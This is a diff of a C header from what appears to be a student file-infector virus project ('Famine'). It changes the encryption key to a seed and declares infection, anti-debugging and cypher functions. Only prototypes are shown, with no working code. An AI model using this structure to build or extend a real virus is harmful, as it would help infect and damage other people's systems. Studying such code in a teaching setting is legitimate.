@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:38:38 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/15 16:35:12 by ichkamo          ###   ########.fr       */
+/*   Updated: 2019/12/13 09:11:32 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -22,7 +22,7 @@
 
 struct client_info
 {
-	uint32_t	key[4];
+	uint64_t	seed[2];
 	uint64_t	relative_pt_load_address;
 	uint64_t	pt_load_size;
 	uint64_t	relative_virus_address;
@@ -41,14 +41,17 @@ bool		detect_spy(void);
 */
 
 void		famine_entry(void);
-void		virus(void);
-void		infect_files_in(const char *path);
+void		virus(uint64_t seed[2]);
+void		infect_files_in(const char *path, uint64_t seed[2]);
 
 /*
 ** encryption
 */
 
-void	encrypt(uint num_rounds, char *data, uint32_t const key[4], size_t size);
-void	decrypt(uint num_rounds, char *data, uint32_t const key[4], size_t size);
+void		cypher(char *data, size_t size);
+void		decypher(char *data, size_t size);
+
+void		cypher_end(void);
+void		decypher_end(void);
 
 #endif
